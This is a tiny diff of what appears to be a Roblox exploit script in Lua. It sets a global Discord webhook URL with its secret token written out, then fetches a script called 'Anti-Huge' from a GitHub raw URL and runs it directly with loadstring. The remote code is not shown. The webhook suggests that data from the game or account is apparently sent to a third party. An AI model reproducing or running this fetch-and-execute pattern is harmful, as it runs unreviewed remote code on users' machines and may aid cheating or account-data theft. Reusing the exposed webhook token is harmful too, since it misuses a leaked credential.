@@ -1,1 +1,2 @@
+_G.Webhook= "https://discord.com/api/webhooks/1069608642149629952/7wQFE5OOCP_5hT5lI93pxqTC9XYU5jFaHx1VrhtT1F_-jLrZvxLVMyEV4v3CfFv9TvEL"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zesty0010/vol/main/Anti-Huge"))()
